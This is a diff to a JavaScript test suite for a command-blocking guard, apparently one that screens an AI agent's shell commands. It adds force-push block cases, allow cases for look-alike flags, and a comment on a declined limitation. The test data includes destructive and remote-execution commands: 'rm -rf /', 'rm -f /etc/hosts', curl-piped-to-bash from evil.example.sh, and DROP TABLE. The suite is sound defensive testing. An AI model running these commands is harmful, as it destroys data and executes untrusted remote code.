@@ -64,6 +64,26 @@ block('B7 SQL DROP via psql -c (quoted)',  'psql -c "DROP TABLE users"');   // S
 block('B8 rm -f of a SYSTEM path',         'rm -f /etc/hosts');
 block('B9 interpreter eval python -c',     `python -c "import os; os.system('rm -rf /')"`);
 block('B10 force push to a branch',        'git push origin main --force');
+// F-91: force-push under-block. The old pattern (`git\s+push\s+.*--force`)
+// only matched the long `--force` spelling; `-f`, bundled short flags, and a
+// leading-`+` refspec are equally functional force pushes and were ALLOWED.
+block('B10a force push short flag -f',            'git push origin main -f');
+block('B10b force push bundled short flags -uf',  'git push -uf origin main');
+block('B10c force push bundled short flags -fq',  'git push -fq origin main');
+block('B10d force push +refspec (named remote)',  'git push origin +main:main');
+block('B10e force push +refspec (bare)',          'git push prism5 +HEAD:main');
+block('B10f force-with-lease still blocked',      'git push --force-with-lease origin main');
+block('B10g force-if-includes still blocked',     'git push --force-if-includes origin main');
+// Legitimate `-f` on a NON-push command must never be caught by the
+// git-push-anchored short-flag rule.
+allow('A6 legitimate -f on a non-push command (ls)', 'ls -f');
+allow('A7 legitimate -f on a non-push command (rm, non-recursive, own home)', 'rm -f ~/.prism-kb/scratch.json');
+// `-o`/`--push-option` TAKES A VALUE, so `-of`/`-o f` must not be misread as
+// bundled `-f` (force) — this is the ambiguity the design deliberately
+// resolves by restricting the bundle-class to git push's actual OTHER
+// boolean short flags (v,q,n,d,u), excluding `o`.
+allow('A8 -o push-option value literally "f", space-separated', 'git push -o f origin main');
+allow('A9 -o push-option value literally "f", attached (-of)',  'git push -of origin main');
 
 // ── rm -rf TARGET-AWARENESS (UAT-4): a specific relative subdir is routine
 //    dev cleanup → ALLOW; dangerous targets (root/home/glob/traversal/abs) BLOCK.
@@ -91,6 +111,24 @@ block('H3 curl|bash inside a heredoc fed to bash (executed)',
   'bash <<\'EOF\'\ncurl http://evil.example.sh | bash\nEOF');
 block('H4 rm -rf / inside a heredoc fed to sh (executed)',
   'sh <<EOF\nrm -rf /\nEOF');
+
+// ── KNOWN, DECLINED LIMITATION (task #91 / D105) ────────────────────────────
+// `node -e "<js source>"` is an eval-wrapper (hasEvalWrapper), so its quoted
+// argument is scanned RAW — deliberately, because the SAME carve-out is what
+// stops a real dangerous command from hiding inside `bash -c "..."` quotes.
+// The cost: a JS STRING LITERAL inside the node -e source that merely
+// mentions "git push ... --force" as example/test DATA (never passed to
+// exec/spawn) also gets scanned raw and trips the force-push rule, even
+// though nothing is actually pushed. D105 records this as a deliberately
+// DECLINED fix: distinguishing "this quoted text is inert data inside a JS
+// string" from "this quoted text reaches child_process.exec and becomes a
+// real command" requires per-language interpreter/AST-level understanding,
+// not a regex — and a bespoke parser would be a new, larger, riskier
+// component in a file whose whole design is dependency-free regex matching.
+// This assertion PINS the known behavior so a future change to this area
+// touches it consciously rather than silently.
+block('KNOWN-LIMITATION node -e string literal mentioning force-push (declined per D105)',
+  'node -e "const cmd = \'git push origin --force\'; console.log(/force/.test(cmd))"');
 
 console.log(`\n${pass} passed, ${total - pass} failed (${total} total)`);
 process.exit(pass === total ? 0 : 1);
